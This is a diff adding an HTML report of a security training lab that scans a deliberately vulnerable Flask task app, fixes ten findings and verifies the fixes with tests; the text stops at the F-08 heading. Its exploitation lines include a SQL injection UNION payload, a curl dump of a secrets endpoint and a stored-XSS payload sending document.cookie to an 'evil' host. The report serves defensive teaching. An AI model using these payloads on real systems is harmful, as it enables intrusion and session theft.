@@ -1,0 +1,788 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>IBM Bob Security Analysis Lab — Full Report</title>
+<style>
+:root {
+  --bg:#ffffff;--surface:#f7f8fa;--surface2:#eef0f4;--border:#e5e7eb;
+  --text:#1f2328;--muted:#57606a;--accent:#3b82d4;--purple:#7c5cd8;
+  --green:#1a7f37;--green-bg:#dafbe1;--red:#cf222e;--red-bg:#ffebe9;
+  --orange:#9a6700;--orange-bg:#fff8c5;--blue-bg:#ddf4ff;--blue:#0969da;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+body{font-family:-apple-system,"Segoe UI",system-ui,sans-serif;font-size:14px;line-height:1.6;color:var(--text);background:var(--bg);}
+.layout{display:flex;min-height:100vh;}
+nav{width:232px;min-width:232px;background:var(--surface);border-right:1px solid var(--border);padding:20px 0;position:sticky;top:0;height:100vh;overflow-y:auto;flex-shrink:0;}
+main{flex:1;min-width:0;padding:36px 48px;max-width:940px;}
+.nav-logo{padding:0 18px 18px;border-bottom:1px solid var(--border);margin-bottom:10px;display:flex;align-items:center;gap:8px;}
+.brand{display:inline-flex;align-items:center;justify-content:center;width:30px;height:30px;border-radius:7px;background:linear-gradient(135deg,#3b82d4,#7c5cd8);color:#fff;font-weight:900;font-size:15px;flex-shrink:0;}
+.nav-logo span{font-weight:700;font-size:13px;}
+nav ul{list-style:none;}
+nav ul li a{display:block;padding:5px 18px;font-size:12.5px;color:var(--muted);text-decoration:none;border-left:3px solid transparent;}
+nav ul li a:hover{color:var(--text);background:var(--surface2);}
+nav ul li a.active{color:var(--accent);border-left-color:var(--accent);background:var(--blue-bg);font-weight:600;}
+.nav-section{padding:10px 18px 3px;font-size:10.5px;font-weight:700;letter-spacing:.08em;color:var(--muted);text-transform:uppercase;}
+.nbadge{float:right;font-size:10px;font-weight:700;padding:1px 5px;border-radius:8px;background:var(--red-bg);color:var(--red);}
+.nbadge.ok{background:var(--green-bg);color:var(--green);}
+section{margin-bottom:52px;scroll-margin-top:20px;}
+h1{font-size:22px;font-weight:800;margin-bottom:6px;letter-spacing:-.02em;}
+h2{font-size:17px;font-weight:700;margin-bottom:14px;padding-bottom:8px;border-bottom:1px solid var(--border);}
+h3{font-size:13.5px;font-weight:700;margin-bottom:8px;}
+p{color:var(--muted);margin-bottom:10px;}
+p strong{color:var(--text);}
+.hero{background:linear-gradient(135deg,#1e2d4a 0%,#2d1f4a 100%);color:#fff;border-radius:12px;padding:28px 34px;margin-bottom:36px;}
+.hero h1{color:#fff;font-size:21px;margin-bottom:4px;}
+.hero p{color:rgba(255,255,255,.7);margin:0;}
+.hero-meta{display:flex;gap:20px;margin-top:18px;flex-wrap:wrap;align-items:center;}
+.hero-stat{text-align:center;}
+.hero-stat .num{font-size:30px;font-weight:900;line-height:1;}
+.hero-stat .lbl{font-size:10px;color:rgba(255,255,255,.6);margin-top:2px;}
+.hdiv{width:1px;background:rgba(255,255,255,.15);align-self:stretch;}
+.timeline{display:flex;gap:0;margin-bottom:28px;}
+.phase{flex:1;padding:14px 10px;background:var(--surface);border:1px solid var(--border);text-align:center;position:relative;}
+.phase:not(:last-child)::after{content:'›';position:absolute;right:-10px;top:50%;transform:translateY(-50%);font-size:18px;color:var(--muted);z-index:1;}
+.phase:first-child{border-radius:8px 0 0 8px;}
+.phase:last-child{border-radius:0 8px 8px 0;}
+.phase .step{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:var(--muted);}
+.phase .ptitle{font-size:12.5px;font-weight:700;color:var(--text);margin-top:3px;}
+.phase.done{background:var(--green-bg);border-color:#a7f3d0;}
+.phase.done .step{color:var(--green);}
+.cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:12px;margin-bottom:20px;}
+.card{background:var(--surface);border:1px solid var(--border);border-radius:9px;padding:14px;}
+.card h3{font-size:12px;color:var(--muted);margin-bottom:3px;font-weight:600;}
+.card .val{font-size:20px;font-weight:800;}
+.card .val.green{color:var(--green);}
+.card .val.red{color:var(--red);}
+.sev{display:inline-block;font-size:10.5px;font-weight:700;padding:2px 7px;border-radius:4px;text-transform:uppercase;letter-spacing:.04em;}
+.sev.critical{background:#ffebe9;color:#cf222e;}
+.sev.high{background:#fff1e5;color:#bc4c00;}
+.sev.medium{background:var(--orange-bg);color:var(--orange);}
+.sev.low{background:var(--green-bg);color:var(--green);}
+.sev.info{background:var(--blue-bg);color:var(--blue);}
+.status{display:inline-flex;align-items:center;gap:4px;font-size:11.5px;font-weight:700;padding:2px 8px;border-radius:99px;}
+.status.fixed{background:var(--green-bg);color:var(--green);}
+.status.open{background:var(--red-bg);color:var(--red);}
+.status::before{content:'';width:6px;height:6px;border-radius:50%;background:currentColor;}
+table{width:100%;border-collapse:collapse;font-size:13px;margin:10px 0;}
+th{text-align:left;padding:8px 11px;background:var(--surface);font-weight:700;border-bottom:2px solid var(--border);font-size:11.5px;}
+td{padding:8px 11px;border-bottom:1px solid var(--border);vertical-align:top;}
+tr:last-child td{border-bottom:none;}
+tr:hover td{background:var(--surface);}
+.diff{border-radius:8px;overflow:hidden;border:1px solid var(--border);margin:12px 0;font-size:11.5px;}
+.diff-header{display:grid;grid-template-columns:1fr 1fr;}
+.dcl{padding:5px 11px;font-size:10.5px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;}
+.dcl.before{background:#ffebe9;color:var(--red);}
+.dcl.after{background:var(--green-bg);color:var(--green);}
+.diff-body{display:grid;grid-template-columns:1fr 1fr;}
+.diff-before,.diff-after{padding:11px;overflow-x:auto;white-space:pre;font-family:'SFMono-Regular',Consolas,monospace;line-height:1.5;}
+.diff-before{background:#fff5f5;border-right:1px solid var(--border);}
+.diff-after{background:#f0fff4;}
+pre{background:var(--surface);border:1px solid var(--border);border-radius:7px;padding:12px 14px;overflow-x:auto;font-size:11.5px;font-family:'SFMono-Regular',Consolas,monospace;line-height:1.6;margin:10px 0;}
+code{font-family:'SFMono-Regular',Consolas,monospace;font-size:11.5px;background:var(--surface2);padding:1px 4px;border-radius:3px;}
+.test-suite{border:1px solid var(--border);border-radius:9px;margin-bottom:12px;overflow:hidden;}
+.ts-header{display:flex;align-items:center;gap:10px;padding:10px 14px;background:var(--surface);}
+.ts-cmd{font-family:'SFMono-Regular',Consolas,monospace;font-size:11.5px;flex:1;color:var(--muted);}
+.tlist{padding:2px 14px 10px;}
+.tr{display:flex;align-items:center;gap:7px;padding:4px 0;border-bottom:1px solid var(--border);font-size:12px;}
+.tr:last-child{border-bottom:none;}
+.tdot{width:7px;height:7px;border-radius:50%;flex-shrink:0;}
+.tdot.pass{background:var(--green);}
+.tname{flex:1;font-family:'SFMono-Regular',Consolas,monospace;font-size:11px;color:var(--muted);}
+.tok{font-size:10.5px;font-weight:700;color:var(--green);}
+.check-row{display:flex;align-items:center;gap:9px;padding:8px 13px;border-bottom:1px solid var(--border);font-size:12.5px;}
+.check-row:last-child{border-bottom:none;}
+.pass-txt{color:var(--green);font-weight:700;font-size:11.5px;min-width:34px;}
+.fail-txt{color:var(--red);font-weight:700;font-size:11.5px;min-width:34px;}
+.callout{border-radius:7px;padding:11px 14px;margin:10px 0;font-size:12.5px;display:flex;gap:9px;align-items:flex-start;}
+.callout.note{background:var(--blue-bg);border-left:3px solid var(--blue);}
+.callout.success{background:var(--green-bg);border-left:3px solid var(--green);}
+.callout p{margin:0;color:var(--text);}
+.callout-icon{font-size:15px;flex-shrink:0;}
+.progress-wrap{margin:4px 0 14px;}
+.progress-label{display:flex;justify-content:space-between;font-size:11.5px;color:var(--muted);margin-bottom:3px;}
+.progress-bar{height:7px;background:var(--surface2);border-radius:99px;overflow:hidden;}
+.progress-fill{height:100%;border-radius:99px;background:linear-gradient(90deg,#1a7f37,#44d7d1);}
+.tag{display:inline-block;font-size:10.5px;font-weight:600;padding:2px 6px;border-radius:4px;background:var(--surface2);color:var(--muted);margin:2px;}
+.chain{display:flex;flex-direction:column;gap:0;}
+.chain-step{display:flex;align-items:flex-start;gap:11px;}
+.chain-left{display:flex;flex-direction:column;align-items:center;}
+.chain-dot{width:26px;height:26px;border-radius:50%;background:var(--red-bg);border:2px solid var(--red);display:flex;align-items:center;justify-content:center;font-size:10.5px;font-weight:800;color:var(--red);flex-shrink:0;}
+.chain-line{width:2px;flex:1;min-height:18px;background:var(--border);margin:2px 0;}
+.chain-content{padding:3px 0 18px;}
+.chain-content h4{font-size:12.5px;font-weight:700;margin-bottom:2px;}
+.chain-content p{font-size:11.5px;margin:0;}
+.footer{margin-top:56px;padding-top:18px;border-top:1px solid var(--border);text-align:center;font-size:12px;color:var(--muted);}
+@media(max-width:800px){nav{display:none;}main{padding:20px 16px;}.diff-header,.diff-body{grid-template-columns:1fr;}.diff-before{border-right:none;border-bottom:1px solid var(--border);}.timeline{flex-direction:column;}.phase{border-radius:8px!important;}.phase:not(:last-child)::after{display:none;}}
+</style>
+</head>
+<body>
+<div class="layout">
+
+<!-- NAV -->
+<nav>
+  <div class="nav-logo"><div class="brand">B</div><span>IBM Bob Lab</span></div>
+  <div class="nav-section">Overview</div>
+  <ul>
+    <li><a href="#overview">Lab Summary</a></li>
+    <li><a href="#architecture">Architecture</a></li>
+    <li><a href="#attack-chain">Attack Chain</a></li>
+  </ul>
+  <div class="nav-section">Phase 1 — Scan</div>
+  <ul>
+    <li><a href="#findings">All Findings <span class="nbadge">10</span></a></li>
+    <li><a href="#f01">F-01 SQL Injection <span class="nbadge">C</span></a></li>
+    <li><a href="#f02">F-02 Config Endpoint <span class="nbadge">C</span></a></li>
+    <li><a href="#f03">F-03 Hardcoded Secrets <span class="nbadge">C</span></a></li>
+    <li><a href="#f04">F-04 Stored XSS <span class="nbadge">H</span></a></li>
+    <li><a href="#f05">F-05 Key Leak <span class="nbadge">H</span></a></li>
+    <li><a href="#f06">F-06 Verbose Errors <span class="nbadge">H</span></a></li>
+    <li><a href="#f07">F-07 Wildcard CORS <span class="nbadge">M</span></a></li>
+    <li><a href="#f08">F-08 Debug Mode <span class="nbadge">M</span></a></li>
+    <li><a href="#f09">F-09 No Validation <span class="nbadge">M</span></a></li>
+    <li><a href="#f10">F-10 Bind 0.0.0.0 <span class="nbadge">L</span></a></li>
+  </ul>
+  <div class="nav-section">Phase 2 — Fix</div>
+  <ul>
+    <li><a href="#remediations">Remediations</a></li>
+    <li><a href="#files-changed">Files Changed</a></li>
+  </ul>
+  <div class="nav-section">Phase 3 — Verify</div>
+  <ul>
+    <li><a href="#tests">Test Results <span class="nbadge ok">57 ✓</span></a></li>
+    <li><a href="#static-checks">Static Checks</a></li>
+    <li><a href="#before-after">Before vs After</a></li>
+    <li><a href="#remaining">Remaining Risks</a></li>
+  </ul>
+</nav>
+
+<!-- MAIN -->
+<main>
+
+<!-- HERO -->
+<div class="hero">
+  <h1>IBM Bob Security Analysis Lab — Full Report</h1>
+  <p>End-to-end security exercise: scan a Flask + vanilla JS task application, remediate every finding in a separate copy, and verify with automated tests.</p>
+  <div class="hero-meta">
+    <div class="hero-stat"><div class="num" style="color:#ff8a82">3</div><div class="lbl">Critical</div></div>
+    <div class="hdiv"></div>
+    <div class="hero-stat"><div class="num" style="color:#ffb347">3</div><div class="lbl">High</div></div>
+    <div class="hdiv"></div>
+    <div class="hero-stat"><div class="num" style="color:#ffd700">3</div><div class="lbl">Medium</div></div>
+    <div class="hdiv"></div>
+    <div class="hero-stat"><div class="num" style="color:#aab2c8">1</div><div class="lbl">Low</div></div>
+    <div class="hdiv"></div>
+    <div class="hero-stat"><div class="num" style="color:#44d7d1">10/10</div><div class="lbl">Fixed</div></div>
+    <div class="hdiv"></div>
+    <div class="hero-stat"><div class="num" style="color:#44d7d1">57</div><div class="lbl">Tests Pass</div></div>
+  </div>
+</div>
+
+<!-- OVERVIEW -->
+<section id="overview">
+  <h2>Lab Summary</h2>
+  <div class="timeline">
+    <div class="phase done"><div class="step">Step 1</div><div class="ptitle">Scan &amp; Analyse</div></div>
+    <div class="phase done"><div class="step">Step 2</div><div class="ptitle">Report Findings</div></div>
+    <div class="phase done"><div class="step">Step 3</div><div class="ptitle">Remediate Code</div></div>
+    <div class="phase done"><div class="step">Step 4</div><div class="ptitle">Verify &amp; Test</div></div>
+  </div>
+  <p>The lab started with a full architecture analysis of <code>vulnerable-app/</code>, identified 10 security findings across 5 categories, applied targeted fixes in a separate <code>secure-app/</code> copy, and verified every fix with automated tests. <code>vulnerable-app/</code> was never modified — checksums confirmed.</p>
+  <div class="cards">
+    <div class="card"><h3>Stack</h3><div class="val" style="font-size:15px">Flask + SQLite</div></div>
+    <div class="card"><h3>Frontend</h3><div class="val" style="font-size:15px">Vanilla JS</div></div>
+    <div class="card"><h3>Findings</h3><div class="val red">10</div></div>
+    <div class="card"><h3>Resolved</h3><div class="val green">10/10</div></div>
+    <div class="card"><h3>pytest</h3><div class="val green">45/45</div></div>
+    <div class="card"><h3>Static checks</h3><div class="val green">6/6</div></div>
+  </div>
+  <div class="progress-wrap">
+    <div class="progress-label"><span>Overall lab completion</span><span>100%</span></div>
+    <div class="progress-bar"><div class="progress-fill" style="width:100%"></div></div>
+  </div>
+</section>
+
+<!-- ARCHITECTURE -->
+<section id="architecture">
+  <h2>Application Architecture &amp; Request Flow</h2>
+  <p>A two-tier web app. The static frontend communicates with a Flask REST API backed by a local SQLite file. No auth layer, no reverse proxy, no build step exist in the original.</p>
+  <pre>Browser (index.html + app.js)
+  │  fetch() JSON over HTTP — port 5000
+  ▼
+Flask API (app.py)
+  │  sqlite3.execute(SQL, params)
+  ▼
+SQLite (tasks.db)     ←—  config.py (secrets loaded at startup)</pre>
+  <table>
+    <thead><tr><th>File</th><th>Purpose</th></tr></thead>
+    <tbody>
+      <tr><td><code>backend/config.py</code></td><td>Runtime settings — secrets, DB path, CORS origins, debug flag, host/port</td></tr>
+      <tr><td><code>backend/database.py</code></td><td>SQLite lifecycle: open/close per-request via Flask <code>g</code>, schema creation, seed rows</td></tr>
+      <tr><td><code>backend/app.py</code></td><td>All HTTP routes (health, tasks CRUD, search, admin) and global error handler</td></tr>
+      <tr><td><code>frontend/index.html</code></td><td>Static shell — task form, search bar, task-list container</td></tr>
+      <tr><td><code>frontend/app.js</code></td><td>All browser logic — API calls, DOM rendering, event wiring</td></tr>
+      <tr><td><code>frontend/styles.css</code></td><td>Pure CSS, dark theme — no logic, no user data</td></tr>
+    </tbody>
+  </table>
+  <h3 style="margin-top:18px">User-Controlled Entry Points</h3>
+  <table>
+    <thead><tr><th>Endpoint</th><th>Input</th><th>Vulnerability (before)</th></tr></thead>
+    <tbody>
+      <tr><td><code>GET /api/tasks/search?q=</code></td><td><code>q</code> query string</td><td>SQL Injection — F-01</td></tr>
+      <tr><td><code>POST /api/tasks</code></td><td>JSON body: title, description</td><td>No validation → Stored XSS — F-04, F-09</td></tr>
+      <tr><td><code>PUT /api/tasks/:id</code></td><td>JSON body: title, description, completed</td><td>No type/length checks — F-09</td></tr>
+      <tr><td><code>POST /api/admin/verify</code></td><td>JSON body: password</td><td>Key leak + brute-force — F-05</td></tr>
+      <tr><td><code>GET /api/admin/config</code></td><td>None required</td><td>Unauthenticated secret dump — F-02</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<!-- ATTACK CHAIN -->
+<section id="attack-chain">
+  <h2>Attack Chain (Before Remediation)</h2>
+  <p>All findings combine into a complete unauthenticated compromise path:</p>
+  <div class="chain">
+    <div class="chain-step">
+      <div class="chain-left"><div class="chain-dot">1</div><div class="chain-line"></div></div>
+      <div class="chain-content">
+        <h4><code>GET /api/admin/config</code> — no auth required &nbsp;<span class="sev critical">F-02 + F-03</span></h4>
+        <p>Returns <code>SECRET_KEY</code>, <code>ADMIN_PASSWORD</code>, and <code>API_KEY</code> in one unauthenticated response. Wildcard CORS (F-07) means any web page can trigger this cross-origin.</p>
+      </div>
+    </div>
+    <div class="chain-step">
+      <div class="chain-left"><div class="chain-dot">2</div><div class="chain-line"></div></div>
+      <div class="chain-content">
+        <h4>Forge Flask session cookie with <code>SECRET_KEY</code> &nbsp;<span class="sev critical">F-03 + F-08</span></h4>
+        <p>Debug mode also activates the Werkzeug interactive debugger — arbitrary Python RCE on any unhandled exception.</p>
+      </div>
+    </div>
+    <div class="chain-step">
+      <div class="chain-left"><div class="chain-dot">3</div><div class="chain-line"></div></div>
+      <div class="chain-content">
+        <h4>SQL Injection via search &nbsp;<span class="sev critical">F-01 + F-06</span></h4>
+        <p><code>?q=' UNION SELECT …</code> reads or destroys the entire database. Verbose errors (F-06) reveal schema, reducing effort.</p>
+      </div>
+    </div>
+    <div class="chain-step">
+      <div class="chain-left"><div class="chain-dot">4</div><div class="chain-line"></div></div>
+      <div class="chain-content">
+        <h4>Store XSS payload via POST /api/tasks &nbsp;<span class="sev high">F-04 + F-09</span></h4>
+        <p>Payload executes in every browser loading the task list — persistent, affects all users.</p>
+      </div>
+    </div>
+    <div class="chain-step">
+      <div class="chain-left"><div class="chain-dot">5</div><div class="chain-line"></div></div>
+      <div class="chain-content">
+        <h4>Server reachable from the internet &nbsp;<span class="sev low">F-10</span></h4>
+        <p>Default bind <code>0.0.0.0</code> on a cloud VM exposes all findings globally without any firewall change.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- FINDINGS INDEX -->
+<section id="findings">
+  <h2>Phase 1 — Security Findings Index</h2>
+  <table>
+    <thead><tr><th>ID</th><th>Title</th><th>Severity</th><th>CWE</th><th>Location</th><th>Status</th></tr></thead>
+    <tbody>
+      <tr><td><a href="#f01">F-01</a></td><td>SQL Injection in search</td><td><span class="sev critical">Critical</span></td><td>CWE-89</td><td><code>app.py:100</code></td><td><span class="status fixed">Fixed</span></td></tr>
+      <tr><td><a href="#f02">F-02</a></td><td>Unauthenticated config endpoint</td><td><span class="sev critical">Critical</span></td><td>CWE-200</td><td><code>app.py:114</code></td><td><span class="status fixed">Fixed</span></td></tr>
+      <tr><td><a href="#f03">F-03</a></td><td>Hardcoded credentials</td><td><span class="sev critical">Critical</span></td><td>CWE-798</td><td><code>config.py:13</code></td><td><span class="status fixed">Fixed</span></td></tr>
+      <tr><td><a href="#f04">F-04</a></td><td>Stored XSS via innerHTML</td><td><span class="sev high">High</span></td><td>CWE-79</td><td><code>app.js:35</code></td><td><span class="status fixed">Fixed</span></td></tr>
+      <tr><td><a href="#f05">F-05</a></td><td>API key returned on auth</td><td><span class="sev high">High</span></td><td>CWE-200</td><td><code>app.py:110</code></td><td><span class="status fixed">Fixed</span></td></tr>
+      <tr><td><a href="#f06">F-06</a></td><td>Verbose error handler</td><td><span class="sev high">High</span></td><td>CWE-209</td><td><code>app.py:127</code></td><td><span class="status fixed">Fixed</span></td></tr>
+      <tr><td><a href="#f07">F-07</a></td><td>Wildcard CORS policy</td><td><span class="sev medium">Medium</span></td><td>CWE-942</td><td><code>config.py:21</code></td><td><span class="status fixed">Fixed</span></td></tr>
+      <tr><td><a href="#f08">F-08</a></td><td>Debug mode enabled</td><td><span class="sev medium">Medium</span></td><td>CWE-94</td><td><code>config.py:22</code></td><td><span class="status fixed">Fixed</span></td></tr>
+      <tr><td><a href="#f09">F-09</a></td><td>No input validation</td><td><span class="sev medium">Medium</span></td><td>CWE-20</td><td><code>app.py:45</code></td><td><span class="status fixed">Fixed</span></td></tr>
+      <tr><td><a href="#f10">F-10</a></td><td>Server bound to 0.0.0.0</td><td><span class="sev low">Low</span></td><td>CWE-668</td><td><code>config.py:24</code></td><td><span class="status fixed">Fixed</span></td></tr>
+    </tbody>
+  </table>
+  <p style="margin-top:10px;font-size:12.5px">Click any finding ID to jump to its detailed section below. Click a column header to sort.</p>
+</section>
+
+<!-- F-01 -->
+<section id="f01">
+  <h2>F-01 — SQL Injection in Search Endpoint</h2>
+  <div style="display:flex;gap:7px;margin-bottom:12px;flex-wrap:wrap">
+    <span class="sev critical">Critical</span><span class="tag">CWE-89</span><span class="tag">OWASP A03:2021</span><span class="tag">app.py:100</span><span class="status fixed">Fixed</span>
+  </div>
+  <p><strong>Evidence:</strong> The <code>q</code> query-string parameter was f-string interpolated directly into a SQL string — never parameterized.</p>
+  <div class="diff">
+    <div class="diff-header">
+      <div class="dcl before">Before — vulnerable-app/backend/app.py:97–102</div>
+      <div class="dcl after">After — secure-app/backend/app.py</div>
+    </div>
+    <div class="diff-body">
+      <div class="diff-before">query = request.args.get("q", "")
+sql = f"SELECT * FROM tasks WHERE title LIKE '%{query}%' ORDER BY id DESC"
+rows = get_db().execute(sql).fetchall()</div>
+      <div class="diff-after">query = request.args.get("q", "")
+rows = get_db().execute(
+    "SELECT * FROM tasks WHERE title LIKE ? ORDER BY id DESC",
+    (f"%{query}%",),
+).fetchall()</div>
+    </div>
+  </div>
+  <p><strong>Exploitation scenario:</strong><br>
+  <code>GET /api/tasks/search?q=' UNION SELECT id,secret_key,admin_password,0,datetime('now') FROM sqlite_master--</code><br>
+  Reads any table. A <code>DROP TABLE</code> variant destroys all data.</p>
+  <p><strong>Regression tests:</strong> <code>TestF01SQLInjection</code> — 4 pytest tests: UNION injection, OR bypass, DROP TABLE attempt, normal search still works. Also covered by <code>test_sql_injection_does_not_bypass_search</code> in the external regression suite.</p>
+</section>
+
+<!-- F-02 -->
+<section id="f02">
+  <h2>F-02 — Unauthenticated Config Endpoint</h2>
+  <div style="display:flex;gap:7px;margin-bottom:12px;flex-wrap:wrap">
+    <span class="sev critical">Critical</span><span class="tag">CWE-200</span><span class="tag">OWASP A02:2021</span><span class="tag">app.py:114</span><span class="status fixed">Fixed</span>
+  </div>
+  <p><strong>Evidence:</strong> <code>GET /api/admin/config</code> returned all three secrets to any unauthenticated HTTP client.</p>
+  <div class="diff">
+    <div class="diff-header">
+      <div class="dcl before">Before — app.py:114–124</div>
+      <div class="dcl after">After — route deleted entirely</div>
+    </div>
+    <div class="diff-body">
+      <div class="diff-before">@app.get("/api/admin/config")
+def expose_config():
+    return jsonify({
+        "secret_key": config.SECRET_KEY,
+        "admin_password": config.ADMIN_PASSWORD,
+        "api_key": config.API_KEY,
+        "debug": config.DEBUG,
+    })</div>
+      <div class="diff-after"># Route and handler deleted in their entirety.
+# GET /api/admin/config now returns 404.
+#
+# Error handler also fixed to re-raise
+# HTTPException so 404 is not swallowed
+# into a generic 500.</div>
+    </div>
+  </div>
+  <p><strong>Exploitation:</strong> <code>curl http://target:5000/api/admin/config</code> — all secrets in one unauthenticated GET, combinable with wildcard CORS (F-07) to exfiltrate from any browser tab.</p>
+  <p><strong>Regression tests:</strong> <code>TestF02ConfigEndpointRemoved</code> (2 tests) + <code>test_config_endpoint_does_not_expose_secrets</code> in external suite.</p>
+</section>
+
+<!-- F-03 -->
+<section id="f03">
+  <h2>F-03 — Hardcoded Credentials and API Key</h2>
+  <div style="display:flex;gap:7px;margin-bottom:12px;flex-wrap:wrap">
+    <span class="sev critical">Critical</span><span class="tag">CWE-798</span><span class="tag">OWASP A07:2021</span><span class="tag">config.py:13</span><span class="status fixed">Fixed</span>
+  </div>
+  <div class="diff">
+    <div class="diff-header">
+      <div class="dcl before">Before — config.py (all six bad defaults)</div>
+      <div class="dcl after">After — config.py (env-var driven)</div>
+    </div>
+    <div class="diff-body">
+      <div class="diff-before">SECRET_KEY    = "training-secret-key-please-change"
+ADMIN_PASSWORD = "BobLabAdmin123!"
+API_KEY       = "sk_training_51ABCDEF_not_a_real_key"
+CORS_ORIGINS  = "*"
+DEBUG         = True
+HOST          = os.getenv("APP_HOST", "0.0.0.0")</div>
+      <div class="diff-after">def _require_env(name):
+    value = os.environ.get(name)
+    if not value:
+        raise RuntimeError(f"'{name}' is not set.")
+    return value
+
+SECRET_KEY     = _require_env("SECRET_KEY")
+ADMIN_PASSWORD = _require_env("ADMIN_PASSWORD")
+API_KEY        = _require_env("API_KEY")
+_raw = os.getenv("ALLOWED_ORIGINS","http://localhost:8080")
+CORS_ORIGINS   = [o.strip() for o in _raw.split(",") if o.strip()]
+DEBUG = os.getenv("FLASK_DEBUG","false").lower()=="true"
+HOST  = os.getenv("APP_HOST", "127.0.0.1")</div>
+    </div>
+  </div>
+  <p>This single config rewrite also fixes F-07 (wildcard CORS), F-08 (debug on), and F-10 (0.0.0.0). The app refuses to start if any required variable is absent. <code>.env.example</code> updated: no real or fake secrets anywhere in source.</p>
+  <p><strong>Regression tests:</strong> <code>TestF03HardcodedCredentials</code> — 5 tests: no hardcoded strings, <code>_require_env</code> raises on missing var, reads from env, debug defaults to False, host defaults to loopback.</p>
+</section>
+
+<!-- F-04 -->
+<section id="f04">
+  <h2>F-04 — Stored XSS via innerHTML</h2>
+  <div style="display:flex;gap:7px;margin-bottom:12px;flex-wrap:wrap">
+    <span class="sev high">High</span><span class="tag">CWE-79</span><span class="tag">OWASP A03:2021</span><span class="tag">app.js:35</span><span class="status fixed">Fixed</span>
+  </div>
+  <div class="diff">
+    <div class="diff-header">
+      <div class="dcl before">Before — app.js renderTasks() lines 35–47</div>
+      <div class="dcl after">After — app.js buildTaskCard()</div>
+    </div>
+    <div class="diff-body">
+      <div class="diff-before">taskList.innerHTML = tasks.map((task) => `
+  &lt;article class="task"&gt;
+    &lt;h3&gt;${task.title}&lt;/h3&gt;
+    &lt;p&gt;${task.description}&lt;/p&gt;
+    &lt;button onclick="deleteTask(${task.id})"&gt;
+      Delete
+    &lt;/button&gt;
+  &lt;/article&gt;
+`).join('');</div>
+      <div class="diff-after">function buildTaskCard(task) {
+  const h3 = document.createElement('h3');
+  h3.textContent = task.title;   // never HTML-parsed
+
+  const p  = document.createElement('p');
+  p.textContent = task.description || 'No description';
+
+  const btn = document.createElement('button');
+  btn.textContent = 'Delete';
+  btn.addEventListener('click', () => deleteTask(task.id));
+  // innerHTML is not used anywhere in the render path
+}</div>
+    </div>
+  </div>
+  <p><strong>Exploitation:</strong> POST <code>{"title":"&lt;img src=x onerror='fetch(evil+document.cookie)'&gt;"}</code> — executes for every user who loads the task list (persistent, stored attack).</p>
+  <p><strong>Regression tests:</strong> <code>TestF04StoredXSSPrevention</code> (2 tests). The <code>textContent</code> path is architecturally safe — the browser API itself prevents HTML parsing.</p>
+</section>
+
+<!-- F-05 -->
+<section id="f05">
+  <h2>F-05 — API Key Returned on Auth Success</h2>
+  <div style="display:flex;gap:7px;margin-bottom:12px;flex-wrap:wrap">
+    <span class="sev high">High</span><span class="tag">CWE-200</span><span class="tag">OWASP A02:2021</span><span class="tag">app.py:110</span><span class="status fixed">Fixed</span>
+  </div>
+  <div class="diff">
+    <div class="diff-header">
+      <div class="dcl before">Before — verify_admin()</div>
+      <div class="dcl after">After — verify_admin()</div>
+    </div>
+    <div class="diff-body">
+      <div class="diff-before">if payload.get("password") == config.ADMIN_PASSWORD:
+    return jsonify({
+        "authenticated": True,
+        "api_key": config.API_KEY   # ← secret in response
+    })</div>
+      <div class="diff-after">import hmac
+match = hmac.compare_digest(
+    provided.encode("utf-8"),
+    config.ADMIN_PASSWORD.encode("utf-8"),
+)
+if match:
+    return jsonify({"authenticated": True})
+    # No secret fields in any response</div>
+    </div>
+  </div>
+  <p><code>hmac.compare_digest</code> runs in constant time — eliminates timing-based oracle attacks that allow byte-by-byte password enumeration via response latency.</p>
+  <p><strong>Regression tests:</strong> <code>TestF05AdminVerifyNoSecretLeak</code> — 5 tests: success without <code>api_key</code>, success without <code>secret_key</code>, wrong password → 401, null body → 401 not 500.</p>
+</section>
+
+<!-- F-06 -->
+<section id="f06">
+  <h2>F-06 — Verbose Error Handler Leaks Internals</h2>
+  <div style="display:flex;gap:7px;margin-bottom:12px;flex-wrap:wrap">
+    <span class="sev high">High</span><span class="tag">CWE-209</span><span class="tag">OWASP A05:2021</span><span class="tag">app.py:127</span><span class="status fixed">Fixed</span>
+  </div>
+  <div class="diff">
+    <div class="diff-header">
+      <div class="dcl before">Before — handle_unexpected_error()</div>
+      <div class="dcl after">After</div>
+    </div>
+    <div class="diff-body">
+      <div class="diff-before">return jsonify({
+    "error": "Unexpected server error",
+    "details": str(error),         # ← exception text to caller
+    "type": type(error).__name__   # ← class name to caller
+}), 500</div>
+      <div class="diff-after">from werkzeug.exceptions import HTTPException
+if isinstance(error, HTTPException):
+    return error    # preserve 4xx codes (e.g. 404)
+logger.exception("Unhandled exception: %s", error)
+return jsonify({
+    "error": "An unexpected error occurred."
+}), 500</div>
+    </div>
+  </div>
+  <p>Stack traces and exception class names go to the server-side Python logger only. The <code>body.details</code> fallback was also removed from the frontend <code>api()</code> wrapper so internal text can never surface in the browser UI.</p>
+  <p><strong>Regression tests:</strong> <code>TestF06VerboseErrorHandler</code> — 2 tests: null body → 400 not 500, no <code>details</code>/<code>type</code> keys in any error response.</p>
+</section>
+
+<!-- F-07 -->
+<section id="f07">
+  <h2>F-07 — Wildcard CORS Policy</h2>
+  <div style="display:flex;gap:7px;margin-bottom:12px;flex-wrap:wrap">
+    <span class="sev medium">Medium</span><span class="tag">CWE-942</span><span class="tag">OWASP A05:2021</span><span class="tag">config.py:21</span><span class="status fixed">Fixed</span>
+  </div>
+  <p><strong>Before:</strong> <code>CORS_ORIGINS = "*"</code> — any origin could cross-fetch the API from inside a victim's browser tab.</p>
+  <p><strong>After (config.py):</strong></p>
+  <pre>_raw = os.getenv("ALLOWED_ORIGINS", "http://localhost:8080")
+CORS_ORIGINS = [o.strip() for o in _raw.split(",") if o.strip()]
+CORS(app, origins=config.CORS_ORIGINS)   # explicit list, never "*"</pre>
+  <p><strong>Regression tests:</strong> <code>TestF07CORSPolicy</code> — 3 tests: allowed origin gets matching ACAO header, wildcard never returned, disallowed origin gets no ACAO.</p>
+</section>
+
+<!-- F-08 -->
+<section id="f08">
+  <h2>F-08 — Debug Mode Enabled by Default</h2>
